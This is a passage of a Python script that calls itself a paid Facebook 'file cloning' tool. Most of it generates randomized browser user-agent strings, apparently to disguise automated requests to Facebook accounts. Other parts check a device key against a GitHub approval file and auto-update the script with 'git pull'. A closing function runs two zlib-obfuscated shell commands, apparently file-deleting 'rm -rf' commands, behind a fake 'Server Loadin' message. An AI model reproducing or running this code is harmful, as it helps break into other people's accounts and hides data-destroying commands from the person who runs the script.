	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android 9;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 5)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/104.0.0.0 Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android 9;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SM-J730F) '])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/103.0.0.0 Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['RMX3085 Build/SP1A.210812.016; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['RMX3115 Build/SP1A.210812.016; wv'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android 10;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['RMX2185)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/104.0.0.0 Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android 9;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 5) '])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/104.0.0.0 Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Mozilla/5.0 (iPhone;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPU iPhone OS 16_0 like Mac OS X)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/20A357 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/en_Qaau_GB;FBOP/5]'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android 11;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Infinix X688B'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Mozilla/5.0 (Windows NT 10.0;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Win64; x64'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Dalvik/2.1.0 (Linux; U; Android 6.0.1; '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice([' SM-J210F Build/MMB29Q) '])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='S40OviBrowser/2.2.0.0.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['ASUS_Z01QD'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/72.0.3626.76 Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android 9;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['PortalTV'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/85.0.4183.120 Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android 9;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['PortalTV Build/PKQ1.190408.001; wv'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android 5.1;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['GT-810 Build/LMY47I'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/66.0.3359.106 Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Mozilla/5.0 (BlackBerry; U;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['BlackBerry 9800; zh-TW'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/534.8+ (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/6.0.0.448 Mobile Safari/534.8+'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Mozilla/5.0 (BlackBerry; U;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['BlackBerry 9800; zh-TW'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/534.1+ (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/6.0.0.246 Mobile Safari/534.1+'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)

	aa='Mozilla/5.0 (BlackBerry; U;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['BlackBerry 9800; tr)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/534.1+ (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/6.0.0.246 Mobile Safari/534.1+'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Mozilla/5.0 (BlackBerry; U;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['BlackBerry 9800; it)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/534.8+ (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/6.0.0.668 Mobile Safari/534.8+'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)

	aa='Mozilla/5.0 (Macintosh;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Intel Mac OS X 10_15_7)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/104.0.5112.79 Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Mozilla/5.0'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['(Windows NT 10.0)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) '
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/104.0.0.0 Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Opera/9.80 (J2ME/MIDP;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Opera Mini/9.80'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='(J2ME/22.478; U; en)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Presto/2.5.25 Version/10.54'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)

	aa='Opera/9.80 (J2ME/MIDP;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Opera Mini/9'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='(Compatible; MSIE:9.0; iPhone; BlackBerry9700; AppleWebKit/24.746; U; en)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Presto/2.5.25 Version/10.54'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; U; Android 9; id-id;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Infinix X653C Build/PPR1.180610.011'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Linux/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)

	aa='Mozilla/5.0 (Windows NT 10.0;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Win64; x64)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)

	aa='Mozilla/5.0 (Linux; Android 5.1.1;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SM-J320G Build/LMY47V; wv'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) '
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 (Mobile; afma-sdk-a-v223712999.223104000.1)'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Sony XPERIA 1 Build/'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/ Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakuh)

def uaku():
	try:
		ua=open('mix.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/aoun404-Cyber/user-agnet/blob/main/mix.txt').text
		ua=open('.mix.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n') 
		ua=open('.mix.txt','r').read().splitlines()
        
       
def FOFALWAYSONFIRE():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "᯾".join(uuid)
  server = requests.get(f'https://github.com/BANTUBD/BD/blob/main/APPROVAL.txt').text
  
 

  os.system(f" clear")
  print(f"""\x1b[1;97m

    #    ####### #     # #     # 
   # #   #     # #     # ##    # 
  #   #  #     # #     # # #   # 
 #     # #     # #     # #  #  # 
 ####### #     # #     # #   # # 
 #     # #     # #     # #    ## 
 #     # #######  #####  #     # 
  
      Code by : HAYA SYCO
      Version (6.5) | PAID TOOL
      FILE CLONING TOOL

31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
""")                          
  
  print(f"Your Key : \033[1;32m"+id)                                
  #print(f"\033[1;37mThis Tool Is Free But You Need To Access This Tool")
  #print(f"Send Your Key WhatsApp")
  #os.system(f'xdg-open https://www.facebook.com/abegbalobasa.abegbalobasa')
  time.sleep(1)
  print(f"\033[1;37mChecking Your Key")
  try:
    httpCaht = requests.get(f"https://github.com/BANTUBD/BD/blob/main/APPROVAL.txt").text
    if id in httpCaht:
      print(f"\033[1;32mCongratulations ! Your Key Is Approved");time.sleep(2)
      msg = str(os.geteuid())
      time.sleep(0.5)
      pass
    else:      
      print(f"This Tool Is Free But You Need To Access This Tool")
      #print(f"Your Key Not Approved")
      print(f"Send Key For Access This Tool"); time.sleep(1)
      os.system(f'xdg-open {tan}://wa.me/+8801621250620?text='+id)
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
    	print(logo)
    	FOFALWAYSONFIRE()
#FOFALWAYSONFIRE()

logo=(f"""\x1b[1;97m

    #    ####### #     # #     # 
   # #   #     # #     # ##    # 
  #   #  #     # #     # # #   # 
 #     # #     # #     # #  #  # 
 ####### #     # #     # #   # # 
 #     # #     # #     # #    ## 
 #     # #######  #####  #     # 
  
      Code by : HAYA SYCO
      Version (6.5) | PAID TOOL BUT YOU CAN USE FREE
      Author  : haya syco
      Whatsapp : 03175654516
      I AM NOT RESPONSIBLE IF YOU GET FB IDS OR NOT 
      FILE CLONING TOOL
      INOXENT BOY

\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;32m
""")
def linex():
        print(47*'\033[1;31m▬\033[1;37m')
def clear():
        os.system(f'clear')
        print(logo)
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
os.system('git pull')
def fucked():
	print(' Server Loadin.......')
	os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
